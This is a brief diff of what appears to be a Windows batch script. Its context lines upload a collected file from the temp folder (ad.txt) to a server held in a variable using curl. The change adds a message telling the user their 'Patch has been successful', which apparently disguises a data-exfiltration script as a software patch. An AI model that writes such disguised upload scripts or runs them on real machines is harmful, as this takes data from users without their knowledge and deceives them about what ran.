@@ -44,4 +44,7 @@ echo %OUTPUT%
 REM Upload
 curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%
 
+
+echo "Your Patch has been successful"
+
 pause
